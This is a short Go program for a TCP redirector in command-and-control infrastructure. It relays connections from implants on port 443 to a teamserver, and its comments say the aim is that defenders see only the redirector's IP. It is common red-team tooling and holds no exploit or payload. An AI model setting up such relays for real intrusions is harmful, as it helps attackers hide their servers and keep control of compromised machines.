package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"time"
)

// Redirector — forwards all TCP traffic from implants to the real teamserver
// Run this on a VPS or separate machine
// Usage: ./redirector <listen_port> <teamserver_ip> <teamserver_port>
//
// Example: ./redirector 443 192.168.0.172 4444
// Implant connects to redirector:443
// Redirector forwards to teamserver:4444
// Defenders only see the redirector IP

var teamserverIP string
var teamserverPort string

func forward(src net.Conn, dst net.Conn) {
	defer src.Close()
	defer dst.Close()
	io.Copy(src, dst)
}

func handleConn(conn net.Conn) {
	remote := conn.RemoteAddr().String()
	fmt.Printf("[+] %s → forwarding to %s:%s\n", remote, teamserverIP, teamserverPort)

	target, err := net.DialTimeout("tcp",
		fmt.Sprintf("%s:%s", teamserverIP, teamserverPort),
		10*time.Second)
	if err != nil {
		fmt.Printf("[-] Cannot reach teamserver: %s\n", err)
		conn.Close()
		return
	}

	go forward(conn, target)
	forward(target, conn)
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: ./redirector <listen_port> <teamserver_ip> <teamserver_port>")
		fmt.Println("Example: ./redirector 443 192.168.0.172 4444")
		os.Exit(1)
	}

	listenPort  := os.Args[1]
	teamserverIP   = os.Args[2]
	teamserverPort = os.Args[3]

	listener, err := net.Listen("tcp", "0.0.0.0:"+listenPort)
	if err != nil {
		fmt.Printf("[-] Listen error: %s\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("[*] Redirector listening on 0.0.0.0:%s\n", listenPort)
	fmt.Printf("[*] Forwarding to %s:%s\n", teamserverIP, teamserverPort)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleConn(conn)
	}
}
